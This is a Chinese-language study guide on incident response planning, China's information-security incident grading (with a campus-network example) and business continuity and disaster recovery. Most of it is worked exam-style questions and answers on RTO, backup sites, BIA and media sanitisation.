确保团队成员熟悉应急流程 🎯 培训目的 确保团队成员了解应急响应计划 熟悉各自的角色和职责 掌握应急响应技能 提高应急响应能力 ✅ 培训内容 应急响应计划内容 角色职责和流程 工具和技术使用 案例分析和经验分享 培训与测试的关系： 活动 频率 目的 形式 培训 至少每年一次 提升知识和技能 课堂、演示、讨论 测试 至少每年一次 验证计划有效性 演练、模拟 桌面演练 每季度 熟悉流程 讨论式 全面演练 每年 实战检验 实战式 5.9 应急响应计划检查 应急响应计划检查频率： 在正常情况下，应急计划应该至少每年进行一次针对正确性和完整性的检查。 💡 应急响应计划检查要求检查频率： 📋 至少每年一次 及时更新对于成功执行应急响应计划是很重要的 作为一般的原则，至少应一年对计划的正确性和完整性进行一次检查 🔄 触发检查的情况 计划发生变化时 系统发生变化时 系统所支持的业务处理发生变化时 恢复规程所需的资源发生重大变化时 ✅ 检查内容 计划的正确性 计划的完整性 联系信息的准确性 流程的有效性 资源的可用性 检查时机： 检查时机 说明 是否必须 定期检查 至少每年一次 ✅ 是 计划变化 计划内容更新时 ✅ 是 系统变化 系统架构调整时 ✅ 是 业务变化 业务流程改变时 ✅ 是 资源变化 恢复资源变更时 ✅ 是 5.10 应急响应计划文档分发 应急响应计划文档的分发原则： 应急响应计划文档应该分发给参与应急响应工作的所有人员。 graph TB A[\"应急响应计划文档\"] B[\"✅ 正确的分发方式\"] C[\"❌ 错误的分发方式\"] A --> B A --> C B --> B1[\"分发给参与应急响应工作的所有人员\"] B --> B2[\"具有多份拷贝在不同的地点保存\"] B --> B3[\"由专人负责保存与分发\"] C --> C1[\"分发给公司所有人员\"] style B fill:#c8e6c9,stroke:#2e7d32 style C fill:#ffcdd2,stroke:#b71c1c 💡 应急响应计划文档分发原则正确的分发方式： ✅ 分发给参与应急响应工作的所有人员 确保相关人员能够及时获取计划 每个参与者都了解自己的职责 便于应急时快速响应 ✅ 具有多份拷贝在不同的地点保存 避免单点故障 确保灾难时仍能获取计划 提高计划的可用性 ✅ 由专人负责保存与分发 确保文档的安全性 控制文档的版本 管理文档的更新 ❌ 不应该分发给公司所有人员 应急计划有敏感性内容 可能包含系统架构信息 可能包含联系方式等敏感信息 只应分发给需要的人员 文档管理要求： 方面 要求 原因 分发范围 仅限参与应急响应的人员 保护敏感信息 存储位置 多个不同地点 提高可用性 版本控制 专人负责管理 确保一致性 访问控制 限制访问权限 保护机密性 更新机制 及时更新分发 保持有效性 5.11 应急响应计划总则 应急响应计划总则包含的内容： 信息安全应急响应计划总则中，包括以下内容： ✅ 编制目的 ✅ 编制依据 ✅ 适用范围 ✅ 工作原则 ❌ 角色职责（不属于总则） graph TB A[\"应急响应计划结构\"] B[\"总则\"] C[\"组织体系\"] D[\"响应流程\"] E[\"保障措施\"] A --> B A --> C A --> D A --> E B --> B1[\"编制目的\"] B --> B2[\"编制依据\"] B --> B3[\"适用范围\"] B --> B4[\"工作原则\"] C --> C1[\"角色职责\"] C --> C2[\"团队组成\"] C --> C3[\"汇报机制\"] D --> D1[\"响应流程\"] D --> D2[\"处置措施\"] D --> D3[\"升级机制\"] E --> E1[\"资源保障\"] E --> E2[\"培训演练\"] E --> E3[\"持续改进\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e8f5e9,stroke:#388e3d style E fill:#f3e5f5,stroke:#7b1fa2 💡 应急响应计划总则内容总则包含的四个部分： 🎯 编制目的 说明制定应急响应计划的目的 明确计划的作用和意义 阐述预期达到的目标 📋 编制依据 相关法律法规 行业标准规范 组织安全策略 🔍 适用范围 适用的组织范围 覆盖的系统和业务 事件类型和级别 ⚖️ 工作原则 统一领导、分级负责 快速响应、科学处置 预防为主、平战结合 ❌ 不属于总则： 角色职责 - 属于组织体系部分 响应流程 - 属于响应流程部分 保障措施 - 属于保障措施部分 应急响应计划结构： 应急响应计划： ├── 总则 │ ├── 编制目的 │ ├── 编制依据 │ ├── 适用范围 │ └── 工作原则 ├── 组织体系 │ ├── 领导机构 │ ├── 工作机构 │ ├── 角色职责 │ └── 专家组 ├── 响应流程 │ ├── 事件分类 │ ├── 响应流程 │ ├── 处置措施 │ └── 升级机制 ├── 保障措施 │ ├── 资源保障 │ ├── 技术保障 │ ├── 培训演练 │ └── 经费保障 └── 附则 ├── 术语定义 ├── 预案管理 └── 实施时间 六、病毒感染响应 6.1 病毒感染的应急处理 发现病毒感染终端后的正确处理步骤： 发现一台被病毒感染的终端后，首先应该：拔掉网线 graph TB A[\"发现病毒感染终端\"] B[\"1️⃣ 第一步拔掉网线\"] C[\"2️⃣ 第二步判断病毒性质\"] D[\"3️⃣ 第三步寻找解决方法\"] E[\"4️⃣ 第四步清除病毒\"] A --> B B --> C C --> D D --> E B --> B1[\"隔离病毒源\"] B --> B2[\"防止扩散\"] B --> B3[\"保护其他系统\"] C --> C1[\"分析病毒类型\"] C --> C2[\"确定采用的端口\"] C --> C3[\"评估影响范围\"] D --> D1[\"搜索解决方案\"] D --> D2[\"联系技术人员\"] D --> D3[\"获取杀毒工具\"] E --> E1[\"清除病毒\"] E --> E2[\"修复系统\"] E --> E3[\"验证安全\"] style B fill:#c8e6c9,stroke:#2e7d32 style C fill:#e3f2fd,stroke:#1976d2 style D fill:#fff3e0,stroke:#f57c00 style E fill:#e8f5e9,stroke:#388e3d 💡 为什么首先要拔掉网线第一时间隔离病毒源的重要性： 🚨 防止病毒扩散 发现病毒后，第一时间应该隔离病毒源 拔掉网线可以立即切断病毒传播途径 防止病毒通过网络感染其他系统 ⚡ 时间就是损失 病毒可能在几秒内传播到整个网络 立即隔离可以最大限度减少损失 其他操作都可以在隔离后进行 🎯 正确的处理顺序 拔掉网线（隔离）✅ 第一步 判断病毒的性质、采用的端口 在网上搜寻病毒解决方法 呼叫公司技术人员 ❌ 错误的做法： 先判断病毒性质 - 浪费时间，病毒可能已扩散 先搜索解决方法 - 病毒继续传播 先呼叫技术人员 - 等待期间病毒扩散 病毒响应步骤详解： 步骤 操作 目的 时间要求 1 拔掉网线 隔离病毒源，防止扩散 立即 2 判断病毒性质 了解病毒类型和传播方式 尽快 3 寻找解决方法 获取清除方案 及时 4 清除病毒 恢复系统正常 按计划 5 验证安全 确认病毒已清除 清除后 6 恢复网络 重新连接网络 验证后 七、我国信息安全事件分级 7.1 事件分级标准 我国信息安全事件分级分为以下级别： 特别重大事件 - 重大事件 - 较大事件 - 一般事件 graph TB A[\"我国信息安全事件分级\"] B[\"特别重大事件\"] C[\"重大事件\"] D[\"较大事件\"] E[\"一般事件\"] A --> B A --> C A --> D A --> E B --> B1[\"影响特别严重\"] B --> B2[\"涉及国家安全\"] B --> B3[\"造成重大损失\"] C --> C1[\"影响严重\"] C --> C2[\"涉及重要系统\"] C --> C3[\"造成较大损失\"] D --> D1[\"影响较大\"] D --> D2[\"涉及一般系统\"] D --> D3[\"造成一定损失\"] E --> E1[\"影响有限\"] E --> E2[\"局部范围\"] E --> E3[\"损失较小\"] style B fill:#ffcdd2,stroke:#b71c1c style C fill:#ffccbc,stroke:#d84315 style D fill:#fff3e0,stroke:#f57c00 style E fill:#c8e6c9,stroke:#2e7d32 💡 我国信息安全事件分级四级分类标准： 🔴 特别重大事件（I级） 造成特别严重影响 涉及国家安全和社会稳定 需要国家层面协调处置 🟠 重大事件（II级） 造成严重影响 涉及重要信息系统 需要省级层面协调处置 🟡 较大事件（III级） 造成较大影响 涉及一般信息系统 需要市级层面协调处置 🟢 一般事件（IV级） 造成一定影响 局部范围内 单位内部可以处置 ❌ 不存在的分级： 严重事件 - 不是标准分级 特别严重事件 - 不是标准分级 7.2 信息系统重要程度划分 依据信息系统的重要程度对信息系统进行划分： 我国信息安全事件分级参考三个要素：信息系统的重要程度、系统损失和社会影响。其中，依据信息系统的重要程度对信息系统进行划分的正确级别包括： graph TB A[\"信息系统重要程度划分\"] B[\"✅ 特别重要信息系统\"] C[\"✅ 重要信息系统\"] D[\"✅ 一般信息系统\"] E[\"❌ 关键信息系统\"] A --> B A --> C A --> D A --> E B --> B1[\"国家关键基础设施\"] B --> B2[\"涉及国家安全\"] B --> B3[\"影响社会稳定\"] C --> C1[\"重要业务系统\"] C --> C2[\"影响较大范围\"] C --> C3[\"重要数据处理\"] D --> D1[\"一般业务系统\"] D --> D2[\"影响有限\"] D --> D3[\"常规数据处理\"] E --> E1[\"不是标准划分\"] E --> E2[\"虽然常用但非官方分类\"] style B fill:#ffcdd2,stroke:#b71c1c style C fill:#ffccbc,stroke:#d84315 style D fill:#fff3e0,stroke:#f57c00 style E fill:#e0e0e0,stroke:#757575 💡 信息系统重要程度划分正确的划分级别： ✅ 特别重要信息系统 国家关键基础设施信息系统 涉及国家安全的信息系统 影响社会稳定的信息系统 一旦遭到破坏会严重危害国家安全、社会秩序和公共利益 ✅ 重要信息系统 重要业务系统 处理重要数据的系统 影响较大范围的系统 一旦遭到破坏会严重影响组织运营 ✅ 一般信息系统 一般业务系统 处理常规数据的系统 影响范围有限的系统 遭到破坏影响相对较小 ❌ 关键信息系统（不是标准划分） 虽然&quot;关键信息系统&quot;在实践中常用 但不是官方标准的划分级别 标准划分是：特别重要、重要、一般 信息系统重要程度划分依据： 划分级别 业务重要性 数据敏感性 影响范围 示例 特别重要信息系统 极高 极高 国家级 金融核心系统、电力调度系统 重要信息系统 高 高 行业/区域级 企业核心业务系统 一般信息系统 中 中 组织级 办公自动化系统 7.3 事件分级考虑要素 我国信息安全事件分级考虑三个要素： ✅ 信息系统的重要程度 ✅ 系统损失 ✅ 社会影响 ❌ 业务损失（不是主要考虑要素） graph TB A[\"信息安全事件分级要素\"] B[\"信息系统的重要程度\"] C[\"系统损失\"] D[\"社会影响\"] A --> B A --> C A --> D B --> B1[\"系统等级保护级别\"] B --> B2[\"系统承载业务重要性\"] B --> B3[\"系统覆盖范围\"] C --> C1[\"系统受损程度\"] C --> C2[\"数据丢失情况\"] C --> C3[\"恢复难度\"] D --> D1[\"影响人数\"] D --> D2[\"影响范围\"] D --> D3[\"社会关注度\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#f3e5f5,stroke:#7b1fa2 💡 事件分级考虑要素三大考虑要素： 🏢 信息系统的重要程度 系统的等级保护级别 系统承载业务的重要性 系统的覆盖范围和用户数 系统在组织中的地位 💥 系统损失 系统受损的程度 数据丢失或泄露情况 系统恢复的难度 直接经济损失 🌐 社会影响 影响的人数和范围 社会关注程度 对公共利益的影响 对社会稳定的影响 ❌ 业务损失不是主要考虑要素 业务损失是结果，不是分级依据 分级主要看系统重要性、损失程度和社会影响 业务损失包含在系统损失中 分级要素对比： 要素 说明 评估指标 信息系统重要程度 系统在组织和社会中的地位 等级保护级别、业务重要性 系统损失 系统和数据受损情况 受损程度、数据丢失、恢复难度 社会影响 对社会和公众的影响 影响范围、关注度、公共利益 7.3 事件分级实际应用 事件分级的三个考虑要素： 我国信息安全事件分级主要考虑以下三个要素： ✅ 信息系统的重要程度 ✅ 系统损失 ✅ 社会影响 这三个要素共同决定了事件的严重程度和响应级别。 7.4 校园网事件分级示例 校园网安全事件分级详细示例： 根据病毒攻击、非法入侵等原因造成的不同影响程度，校园网安全事件分为四个级别： graph TB A[\"校园网安全事件分级\"] B[\"一般事件IV级\"] C[\"较大事件III级\"] D[\"重大事件II级\"] E[\"特别重大事件I级\"] A --> B A --> C A --> D A --> E B --> B1[\"200台以内主机不能正常工作\"] B --> B2[\"在校内造成一定影响\"] B --> B3[\"尚未在社会上造成影响\"] C --> C1[\"部分楼宇网络瘫痪\"] C --> C2[\"FTP及部分网站服务器不能响应\"] C --> C3[\"在校内造成广泛影响\"] C --> C4[\"在社会上造成一定影响\"] D --> D1[\"部分园区瘫痪\"] D --> D2[\"邮件、计费服务器不能正常工作\"] D --> D3[\"在校内造成实质性影响\"] D --> D4[\"在社会上造成严重影响\"] E --> E1[\"校园网整体瘫痪\"] E --> E2[\"全部DNS、主WEB服务器不能正常工作\"] E --> E3[\"校园网出口中断\"] E --> E4[\"在校内外造成重大实质性影响\"] E --> E5[\"严重危害国家和社会\"] style B fill:#c8e6c9,stroke:#2e7d32 style C fill:#fff3e0,stroke:#f57c00 style D fill:#ffccbc,stroke:#d84315 style E fill:#ffcdd2,stroke:#b71c1c 7.4.1 一般事件（IV级） 示例： 校园网内由于病毒攻击、非法入侵等原因，200台以内的用户主机不能正常工作。 💡 一般事件特征影响范围评估： 📊 影响程度 200台以内用户主机受影响 在校内造成一定影响 尚未在社会上造成影响 🎯 分级判断依据 影响范围：局部（校园内） 影响程度：有限（200台以内） 社会影响：无 符合一般事件的特征 ✅ 处置方式 在组织内部可以处置 不需要上级部门协调 损失可控 7.4.2 较大事件（III级） 示例： 由于病毒攻击、非法入侵等原因： 校园网部分楼宇出现网络瘫痪 FTP及部分网站服务器不能响应用户请求 💡 较大事件特征影响范围评估： 📊 影响程度 部分楼宇网络瘫痪 部分服务器不能响应 在校内造成广泛影响 在社会上造成一定的影响 🎯 分级判断依据 影响范围：较大（多个楼宇） 影响程度：较严重（服务中断） 社会影响：一定影响 符合较大事件的特征 ⚠️ 处置方式 需要市级层面协调处置 可能需要外部技术支持 需要及时通报 7.4.3 重大事件（II级） 示例： 由于病毒攻击、非法入侵等原因： 校园网部分园区瘫痪 邮件、计费服务器不能正常工作 💡 重大事件特征影响范围评估： 📊 影响程度 部分园区网络瘫痪 关键服务器（邮件、计费）不能工作 在校内造成实质性影响 在社会上造成严重影响 🎯 分级判断依据 影响范围：重大（整个园区） 影响程度：严重（关键服务中断） 社会影响：严重影响 符合重大事件的特征 🚨 处置方式 需要省级层面协调处置 必须启动应急预案 需要向上级报告 可能需要外部专家支持 7.4.4 特别重大事件（I级） 示例： 由于病毒攻击、非法入侵、人为破坏或不可抗力等原因： 校园网整体瘫痪 校园网络中心全部DNS、主WEB服务器不能正常工作 校园网出口中断 💡 特别重大事件特征影响范围评估： 📊 影响程度 校园网整体瘫痪 核心服务全部中断 网络出口完全中断 在校内外造成重大实质性影响 严重危害国家和社会 🎯 分级判断依据 影响范围：全局（整个校园网） 影响程度：特别严重（全部中断） 社会影响：严重危害国家和社会 符合特别重大事件的特征 🔴 处置方式 需要国家层面协调处置 必须立即启动最高级别应急预案 需要向国家主管部门报告 需要多方协调和支持 校园网事件分级对比表： 事件级别 受影响范围 服务中断情况 校内影响 社会影响 处置层级 一般事件（IV级） 200台以内主机 局部用户 一定影响 无 单位内部 较大事件（III级） 部分楼宇 FTP、部分网站 广泛影响 一定影响 市级协调 重大事件（II级） 部分园区 邮件、计费服务器 实质性影响 严重影响 省级协调 特别重大事件（I级） 整体瘫痪/出口中断 全部DNS、主WEB 重大实质性影响 危害国家和社会 国家协调 八、业务连续性管理与灾难恢复 8.1 IT服务连续性管理 确保重大故障后IT服务连续性： 由于独立的信息系统增加，一个国有房产公司要求在发生重大故障后，必须保证能够继续提供IT服务。需要实施哪个流程才能提供这种保证性？ 答案：IT服务连续性管理 💡 IT服务连续性管理IT服务连续性管理的目标： 🎯 主要目标 IT服务连续性管理的目标之一是保障灾难性故障发生后，能尽快恢复业务或仍能提供服务 确保业务运营在灾难期间也能继续 最大限度减少业务中断时间 为什么其他选项不正确： 可用性管理 - 关注系统正常运行时间，不是灾难恢复 服务级别管理 - 管理服务协议，不是连续性 服务管理 - 通用术语，不专指连续性 8.2 业务持续性计划中的危机宣布 未定义危机宣布的风险： 在一家企业的业务持续性计划中，什么情况被宣布为一个危机没有被定义。这一点关系到的主要风险是： 答案：灾难恢复计划的执行可能会被影响 💡 危机宣布定义的重要性为什么未定义危机宣布有问题： 🚨 影响计划执行 如果组织不知道什么时候应该宣告灾难发生，将会影响业务持续性计划的执行 延迟宣告意味着延迟响应 响应团队的作用将被削弱 其他选项是危机评估的步骤： 对这种情况的评估可能会延迟 团队通知可能不会发生 对潜在危机的识别可能会无效 这些都是判定灾难是否产生的步骤，但核心问题是没有明确的宣告标准，整个灾难恢复计划执行都会受到影响。 8.3 硬件更换后的活动 信息处理设施（IPF）硬件更换后的首要活动： 在信息处理设施（IPF）的硬件更换之后，业务连续性流程经理首先应该实施下列哪项活动？ 答案：更新信息资产清单 💡 为什么首先更新资产清单信息资产清单的重要性： 📋 BCP/DR的基础 信息资产清单是业务连续性和灾难恢复计划的基础 灾备计划必须反映最新的信息系统架构 计划必须基于当前系统配置 为什么其他选项在后： 验证与热门站点的兼容性 - 在清单更新后进行 检查实施报告 - 管理任务，不是技术优先级 进行灾难恢复计划的演练 - 在计划更新后进行 正确顺序： 更新信息资产清单 ✅ 基于新清单更新灾难恢复计划 验证兼容性并进行演练 8.4 灾难恢复计划目标 组织灾难恢复计划的目标： 组织的灾难恢复计划应该： 答案：减少恢复时间，降低恢复费用 💡 灾难恢复计划目标主要目标： ⏱️ 减少恢复时间 最大限度缩短恢复正常运营的时间 快速响应和恢复程序 预先规划的恢复策略 💰 降低恢复费用 成本效益的恢复解决方案 高效的资源利用 最大限度减少整体灾难影响成本 为什么其他选项不正确： 增加恢复时间，提高恢复费用 - 与目标相反 减少恢复的持续时间，提高恢复费用 - 部分正确但不是最优 对恢复时间和费用都不影响 - 计划专门旨在优化两者 8.5 地理分布组织的成本效益测试 具有大量分支机构且分布地理区域较广的组织的测试方法： 一个组织具有的大量分支机构且分布地理区域较广。以确保各方面的灾难恢复计划的评估，具有成本效益的方式，应建议使用： 答案：预案测试 💡 为什么预案测试最具成本效益预案测试的优势： 💰 成本效益 可以在每一个当地办事处/地区进行 不需要昂贵的全面演练 资源需求最少 可以持续在该计划的不同方面执行 🌍 适合分布式组织 每个分支机构可以进行本地预案测试 测试本地业务连续性的不同方面 是一个能获得该计划足够证据的具有成本效益的方式 可在地理位置间扩展 为什么其他选项不太适合： 数据恢复测试 - 范围有限，不能确保各方面的评价 充分的业务测试 - 对地理上分散的分支机构不是最符合成本效益的测试 前后测试 - 是一个阶段的测试执行过程，不够全面 8.6 恢复时间目标（RTO）影响 较低的恢复时间目标（RTO）的结果： 较低的恢复时间目标（恢复时间目标）的会有如下结果： 答案：更高的容灾成本 💡 RTO与成本关系理解RTO： ⏱️ 什么是RTO 恢复时间目标（RTO）是基于可以接受的停机时间的 较低的RTO意味着更少的可接受停机时间 需要更快的恢复能力 💰 成本影响 较低的恢复时间目标，就会有更高的成本回收的策略 需要更昂贵的基础设施和解决方案 在冗余和自动化方面需要更大投资 为什么其他选项不正确： 更高的成本 ✅ 正确 更长的中断时间 ❌ 较低的RTO意味着更短的中断 更多许可的数据丢失 ❌ 那是RPO，不是RTO 8.7 实施灾难恢复计划后的下一步 实施灾难恢复计划后的下一步： 组织实施了灾难恢复计划。下列哪些步骤应下一步执行？ 答案：进行纸面测试 💡 为什么纸面测试排在第一最佳实践顺序： 📋 纸面测试优先 最好的做法是进行纸面测试 低成本验证计划逻辑的方式 识别明显的差距和问题 为更复杂的测试做准备 为什么其他选项在前或在后： 取得高级管理人员认可 - 应该在计划实施之前完成 确定的业务需求 - 在计划开发之前完成 进行系统还原测试 - 在纸面测试验证计划后进行 正确测试顺序： 纸面测试（验证计划逻辑） 系统/技术测试（验证技术程序） 全面演练（验证完整响应） 8.8 灾难性恢复计划（DRP）基础 灾难性恢复计划（DRP）基于： 答案：技术方面的业务连续性计划 💡 DRP与BCP关系理解关系： 🔧 DRP是技术组件 灾难恢复计划（DRP）是技术方面的业务连续性计划 专注于IT系统和技术恢复 实施系统恢复的技术程序 🏢 BCP更广泛 业务恢复计划是业务持续性计划的运作部分 涵盖业务流程和操作程序 包括连续性的非技术方面 组件分解： 业务连续性计划（BCP） - 整体框架 技术方面 → 灾难恢复计划（DRP）✅ 操作方面 → 业务恢复计划（BRP） 功能方面 → 各种功能计划 8.9 非关键系统的恢复方案 恢复非关键系统的最合理方案： 答案：冷站 💡 恢复站点选项冷站特征： 💰 成本效益 通常成本比较低的选项 只提供最基本的环境 适合非临界应用 ⏱️ 较长恢复时间 投入使用需要更多时间 对非关键系统可以接受 成本节省证明较长恢复时间合理 其他站点类型： 热站 - 最高成本，最短恢复时间，用于关键系统 温站 - 中等成本，中等恢复时间，适合敏感的行动 移动站点 - 特别设计的拖车式计算设备，用于特定需求 8.10 业务连续性计划的适当测试方法 适用于业务连续性计划（BCP）的适当测试方法： 答案：纸面测试 💡 BCP测试方法为什么纸面测试适当： 📋 适合BCP 纸面测试适用与对业务连续性计划的测试 基于讨论的演练格式 测试计划逻辑和程序 识别差距和改进领域 其他选项： 试运行 - 更多用于系统测试 单元测试 - 用于软件开发 系统测试 - 用于技术系统 8.11 中断和灾难中持续运营的技术手段 在中断和灾难事件中提供持续运营的技术手段： 答案：硬件冗余 💡 持续运营技术硬件冗余优势： 🔄 真正的连续性 硬件冗余是目前支持持续、不间断服务的唯一的技术手段 提供无缝故障转移能力 消除单点故障 为什么其他选项不提供连续性： 负载平衡 - 通过分配工作量提高性能，不是连续性 高可用性（HA） - 提供快速但不是持续的恢复 分布式备份 - 需要很长的恢复时间，不是持续的 8.12 业务持续计划中最重要的发现 业务持续计划中最重要的发现： 答案：骨干网备份的缺失 💡 关键基础设施依赖为什么骨干网最关键： 🌐 网络依赖性 骨干网的失效将导致全部网络的瘫痪 影响网络中用户对信息的访问 整个基础设施的单点故障 影响对比： 骨干网故障 ✅ 影响整个网络 不可用的交互PBX系统 - 用户可以利用移动电话或email 用户PC机缺乏备份机制 - 仅影响特定的用户 门禁系统的失效 - 可以通过手工的监控措施来降低风险 8.13 热站、温站或冷站协议考虑事项 热站、温站或冷站协议中的重要考虑事项： 答案：同时允许使用设施的订户数量 💡 站点协议考虑为什么同时使用限制很重要： 📊 容量规划 合同应详细说明在同一时间允许使用站点的订户数 对确保灾难期间可用性至关重要 多个组织可能同时需要站点 为什么其他选项不太关键： 具体的保证设施 - 重要但不是合同细节 订户的总数 - 不如同时使用重要 涉及的其他用户 - 应在签署前考虑，不是合同条款 8.14 业务持续计划基础 企业业务持续计划的基础： 企业的业务持续性计划中应该以记录以下内容的预定规则为基础： 答案：损耗的持续时间 💡 业务持续计划基础为什么持续时间是关键： ⏱️ 最大可容忍期间 企业的业务持续性计划实施应首先建立在业务职能被中断前的最大期间内 这应是在企业目标被成功中断之前 决定恢复优先级和策略 基础要素： 损耗的持续时间 ✅ 主要考虑 损耗的类型 - 次要考虑 损耗的可能性 - 风险评估输入 损耗的原因 - 分析输入，不是基础 8.15 备份驱动器故障后的文件恢复 备份过程中备份驱动器故障后的文件恢复： 当更新一个正在运行的在线订购系统时，更新都记录在一个交易磁带和交易日志副本。在一天业务结束后，订单文件备份在磁带上。在备份过程中，驱动器故障和订单文件丢失。以下哪项对于恢复文件是必需的？ 答案：前一天的备份文件和当前的交易磁带 💡 文件恢复策略恢复组件： 📼 前一天的备份 前一天的备份文件将是该系统最当前活动的历史备份 提供恢复的基线 包含到前一个备份点的所有数据 📝 当前交易磁带 当前的交易文件将包含所有的当天的活动 包含自上次备份以来的所有交易 能够完全恢复到故障点 为什么这个组合有效： 前一天备份 + 当前交易 = 完全恢复 将系统恢复到故障前的确切状态 如果正确实施，无数据丢失 8.16 业务影响分析的主要目的 业务影响分析的主要目的： 答案：识别能够影响组织运营持续性的事件 💡 BIA主要目的业务影响分析（BIA）目标： 🎯 识别影响事件 业务影响分析（BIA）是业务持续性计划中的一个关键环节 BIA将识别影响组织运营的持续性的灾难事件 专注于理解什么可能中断业务 为什么其他选项是次要的： 在灾难之后提供一个恢复行动的计划 - 那是灾难恢复计划 公布组织对物理和逻辑安全的义务 - 那是安全策略 提供一个有效灾难恢复计划的框架 - BIA提供输入，不是框架 8.17 理解组织业务流程的工具 建立业务持续性计划时理解业务流程的工具： 当建立一个业务持续性计划时，使用哪个工具用来理解组织业务流程？ 答案：风险评估和业务影响评估 💡 理解业务流程的工具风险评估和业务影响评估的作用： 🔍 理解业务的关键工具 风险评估和业务影响评估是理解业务持续性计划的工具 帮助识别关键业务流程 评估业务中断的影响 确定恢复优先级 其他选项的作用： 业务持续性自我评估 - 评价BCP的频率的工具，不是理解业务的工具 资源的恢复分析 - 识别业务恢复策略的工作，不是理解业务流程 差异分析 - 在业务持续性计划中识别不足，不是用于获取对业务的理解 工具对比： 工具 主要用途 适用阶段 风险评估和BIA 理解业务流程和影响 计划制定前 业务持续性自我评估 评价BCP频率 计划评估阶段 资源恢复分析 识别恢复策略 策略制定阶段 差异分析 识别计划不足 计划审查阶段 8.18 支持24/7可用性的最佳方案 最好地支持24/7可用性的技术： 答案：镜像 💡 24/7可用性支持镜像的优势： 🔄 快速恢复 关键组件的镜像是促进快速恢复的工具 提供实时数据复制 支持即时故障转移 实现真正的24/7可用性 其他选项的局限： 日常备份 - 使合理的恢复在数小时内发生而不是立即发生 离线存储 - 不支持持续可用性 定期测试 - 验证计划有效性，但不支持持续可用性 可用性方案对比： 方案 恢复时间 数据丢失 成本 适用场景 镜像 即时 无/极少 高 24/7关键系统 日常备份 数小时 一天数据 低 一般系统 离线存储 数天 较多 很低 归档数据 定期测试 N/A N/A 中 验证用途 8.19 评估BCP时的最关注事项 评估BCP时应当最被关注的事项： 答案：宣布灾难的职责没有被识别 💡 为什么灾难宣布职责最关键灾难宣布的重要性： 🚨 激活计划的前提 如果没有人宣布灾难，反应和恢复计划将不会被激活 使所有其他关注都保持沉默 这是启动整个应急响应的关键 其他关注的相对重要性： 灾难等级基于受损功能的范围，而不是持续时间 - 虽然考虑持续时间不足可能是个问题，但它不象范围那般意义重大，并且它们都不如需要某人激活计划这般紧要 低级别灾难和软件事件之间的区别不清晰 - 事件和低等级灾害的区别总是模糊不清并且经常地围绕着纠正损害所需的时间总量 总体BCP被文档化，但详细恢复步骤没有规定 - 详细步骤的不足应该纪录在案，但是，如果在事实上有人激活了该计划，那么详细步骤的缺失并不意味着恢复的不足 BCP评估优先级： 关注事项 严重程度 影响 优先级 宣布灾难职责未识别 🔴 最高 计划无法激活 1 灾难等级定义不当 🟡 中 响应可能不匹配 2 事件区别不清晰 🟡 中 可能误判级别 3 详细步骤缺失 🟢 低 执行可能困难 4 8.20 模拟演练中报警系统破坏的建议 报警系统严重受到设施破坏时的最佳建议： 在一个业务继续计划的模拟演练中，发现报警系统严重受到设施破坏。 答案：建立冗余的报警系统 💡 为什么冗余是最佳控制冗余系统的优势： 🔄 最佳控制措施 如果报警系统受到严重破坏，冗余将是最好的控制 提供备用系统 确保在主系统失效时仍能报警 消除单点故障 其他选项为什么不可行： 培训救护组如何使用报警系统 - 救护组将不能使用严重破坏的报警系统，甚至即使他们被培训去使用它 报警系统为备份提供恢复 - 备份的恢复对报警系统无关 把报警系统存放地窖里 - 将也没有什么价值，如果建筑遭到破坏 报警系统保护措施对比： 措施 有效性 成本 适用场景 建立冗余系统 ✅ 高 高 关键设施 培训使用 ❌ 低 低 系统破坏时无效 备份恢复 ❌ 不适用 N/A 与报警系统无关 地窖存放 ❌ 低 低 建筑破坏时无效 8.21 评估业务连续计划效果的最好方法 评估业务连续计划效果最好的方法： 答案：比较之前的测试结果 💡 为什么之前的测试结果最有效测试结果的价值： 📊 有效证明 之前的测试结果将提供业务持续性计划的有效证明 显示计划的实际执行效果 可以追踪改进趋势 提供客观的评估依据 其他方法的局限： 使用适当的标准进行规划 - 与标准做比较，对该计划涉及的关键方面的业务连续性计划将给予一些保证，但对其有效性不会有任何揭示 紧急预案和员工培训 - 评审紧急预案将提供深入了解计划的某些方面，但可能不能提供该计划的整体成效的保证 环境控制和存储站点 - 存储站点和环境控制将提供深入了解计划的某些方面，但可能不能提供该计划的整体成效的保证 评估方法对比： 评估方法 有效性 全面性 客观性 比较之前测试结果 ✅ 高 ✅ 高 ✅ 高 与标准比较 🟡 中 🟡 中 ✅ 高 评审紧急预案 🟡 中 ❌ 低 🟡 中 检查环境控制 🟡 中 ❌ 低 ✅ 高 8.22 废旧磁带丢弃前的最佳处理方式 丢弃废旧磁带前的最佳处理方式： 答案：对磁带进行消磁 💡 为什么消磁是最佳方法消磁的优势： 🧲 彻底清除数据 处理废弃磁带的最佳方法是进行消磁 使用强磁场彻底清除磁性记录 确保数据无法恢复 符合数据安全处置要求 其他方法的局限： 删除磁带 - 删除磁带上的数据还留下比少量磁信息 复写磁带 - 复写或删除磁带可以使磁记录改变，但不能完全清除数据 初始化磁带卷标 - 初始化磁带不能清除磁带卷标后的数据 数据清除方法对比： 方法 安全性 彻底性 成本 推荐度 消磁 ✅ 最高 ✅ 完全清除 中 🔴 强烈推荐 复写 🟡 中 🟡 部分残留 低 🟡 一般 删除 ❌ 低 ❌ 可恢复 很低 ⚪ 不推荐 初始化 ❌ 很低 ❌ 大量残留 很低 ⚪ 不推荐 数据销毁最佳实践： 磁带数据销毁流程： ├── 第一步：分类 │ ├── 识别包含敏感数据的磁带 │ ├── 确定数据敏感级别 │ └── 记录磁带信息 ├── 第二步：消磁 │ ├── 使用专业消磁设备 │ ├── 确保消磁彻底 │ └── 记录消磁过程 ├── 第三步：验证 │ ├── 验证数据无法读取 │ ├── 确认消磁效果 │ └── 记录验证结果 └── 第四步：物理销毁（可选） ├── 对高敏感数据磁带 ├── 进行物理破坏 └── 记录销毁过程 8.23 多个BCP计划的协调 组织中存在多个独立流程的BCP但缺乏全面计划时的行动： 组织中对于每个独立流程都有对应的业务连续性计划，但缺乏全面的业务连续性计划。 答案：确认所有的业务连续性计划是否相容 💡 为什么需要确认计划相容性计划协调的重要性： 🔄 相容性优先于整合 对于复杂的组织应该有各方面的业务连续性和灾难恢复计划 并不需要整合成一个单独的计划 但是每个计划应该与其他的业务连续性计划策略保持相容 确保计划之间不冲突 为什么不需要全面整合： 建议建立全面的业务连续性计划 - 对复杂组织不现实 接受已有业务连续性计划 - 忽略了相容性问题 建议建立单独的业务连续性计划 - 已经有独立计划了 